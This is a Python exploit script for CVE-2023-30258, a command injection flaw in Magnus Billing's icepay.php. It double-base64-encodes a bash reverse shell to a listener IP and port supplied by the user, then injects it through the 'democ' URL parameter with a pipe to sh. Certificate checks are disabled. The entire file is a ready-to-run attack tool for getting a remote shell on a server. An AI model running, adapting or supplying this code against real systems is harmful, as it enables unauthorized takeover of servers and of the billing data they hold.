import requests
import json
import argparse
import base64

class Magnus():
    def __init__(self,target,lhost,lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.url = self.check_url()
        self.exploit()

    def check_url(self):
        check = self.target[-1]
        if check == "/":
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def convert_to_b64(self,payload):
        payload_bytes = payload.encode("ascii")   
        base64_bytes = base64.b64encode(payload_bytes)
        return base64_bytes.decode("ascii")
    
    def exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("Sending payload...")
        payload = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
        encoded_payload_1 = self.convert_to_b64(payload)
        encoded_payload_2 = self.convert_to_b64(encoded_payload_1)
        target_url = self.url + "lib/icepay/icepay.php?democ=null;echo " + encoded_payload_2 + "|base64 -d|base64 -d|sh;null"
        upload_req = requests.get(target_url,verify=False)

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='CVE-2023-30258 Magnus Billing - Command Injection Vulnerability')
    parser.add_argument('-t', metavar='<Target base URL>', help='Example: -t http://magnusbilling.url/', required=True)
    parser.add_argument('-lh', metavar='<Listener IP>',help="Example: -lh 127.0.0.1", required=True)
    parser.add_argument('-lp', metavar='<Listener Port>',help="Example: -lp 1337", required=True)
    args = parser.parse_args()

    try:
        print('CVE-2023-30258 Magnus Billing - Command Injection Vulnerability')
        Magnus(args.t,args.lh,args.lp)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()
